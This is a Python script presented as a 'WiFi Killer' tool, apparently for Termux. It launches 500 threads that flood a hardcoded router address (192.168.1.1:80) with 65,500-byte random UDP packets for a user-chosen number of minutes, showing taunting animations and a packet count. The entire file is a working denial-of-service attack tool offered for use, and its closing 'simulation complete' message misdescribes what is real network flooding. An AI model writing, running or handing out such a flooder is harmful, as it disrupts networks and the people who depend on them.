#!/usr/bin/env python3
import socket
import threading
import time
import random
import os
import sys

# Colors for Termux
G = "\033[92m"
R = "\033[91m"
Y = "\033[93m"
C = "\033[96m"
W = "\033[97m"
RESET = "\033[0m"

target_ip = "192.168.1.1"
target_port = 80
packet_size = 65500
packet_count = 0

def flood(stop_event):
    global packet_count
    while not stop_event.is_set():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(0.01)
            payload = random._urandom(packet_size)
            sock.sendto(payload, (target_ip, target_port))
            packet_count += 1
        except:
            pass

def clear():
    os.system('clear')

def banner():
    clear()
    print(f"""
{R}╔═══════════════════════════════════════════╗
{R}║{W}   💀 ZeeMby-Riyad — WiFi Killer 💀    {R}║
{R}╚═══════════════════════════════════════════╝{RESET}
    """)

def animation(stop_event):
    frames = [
        f"{R}[💢] Server is shaking...{RESET}",
        f"{Y}[⚠️] Pray for WiFi signal...{RESET}",
        f"{R}[💀] nuclear rain incoming...{RESET}",
        f"{C}[📡] system Overload...{RESET}",
        f"{R}[🔥] Server under heavy fire...{RESET}",
        f"{G}[💣] Crushing connection...{RESET}"
    ]
    i = 0
    while not stop_event.is_set():
        print(f"\r{C}⏳ {frames[i % len(frames)]}{RESET}", end="")
        i += 1
        time.sleep(0.8)

def main():
    banner()
    print(f"{C}⚡ Select attack duration:{RESET}")
    print(f"{G}1){W} 5 minutes")
    print(f"{G}2){W} 20 minutes")
    print(f"{G}3){W} 30 minutes")
    print(f"{G}4){W} Custom")
    print(f"{R}0){W} Exit\n")

    choice = input(f"{Y}➜ {W}Your choice: ")

    minutes = 0
    if choice == "1":
        minutes = 5
    elif choice == "2":
        minutes = 20
    elif choice == "3":
        minutes = 30
    elif choice == "4":
        try:
            minutes = int(input(f"{Y}➜ {W}Enter minutes: "))
        except:
            print(f"{R}Invalid.{RESET}")
            sys.exit()
    elif choice == "0":
        print(f"{R}Bye.{RESET}")
        sys.exit()
    else:
        print(f"{R}Invalid.{RESET}")
        sys.exit()

    seconds = minutes * 60
    print(f"\n{G}[✔]{W} Attack running for {Y}{minutes}{W} min.")
    print(f"{R}[!] CTRL+C to stop early.{RESET}\n")

    stop_event = threading.Event()
    threads = []
    for _ in range(500):
        t = threading.Thread(target=flood, args=(stop_event,))
        t.daemon = True
        t.start()
        threads.append(t)

    anim_thread = threading.Thread(target=animation, args=(stop_event,))
    anim_thread.daemon = True
    anim_thread.start()

    start_time = time.time()
    try:
        while True:
            elapsed = int(time.time() - start_time)
            remaining = max(0, seconds - elapsed)
            mins_left = remaining // 60
            secs_left = remaining % 60
            print(f"\r{C}⏱ {mins_left:02d}:{secs_left:02d} left | {R}📦 {packet_count} packets sent{RESET}", end="")
            if elapsed >= seconds:
                break
            time.sleep(1)
    except KeyboardInterrupt:
        print(f"\n{R}[!] Aborted.{RESET}")

    stop_event.set()
    for t in threads:
        t.join(timeout=0.1)

    print(f"\n{G}[✔] Server down simulation complete.{RESET}")
    print(f"{R}💀 WiFi crushed. ZeeMby-Riyad out.{RESET}")

if __name__ == "__main__":
    main()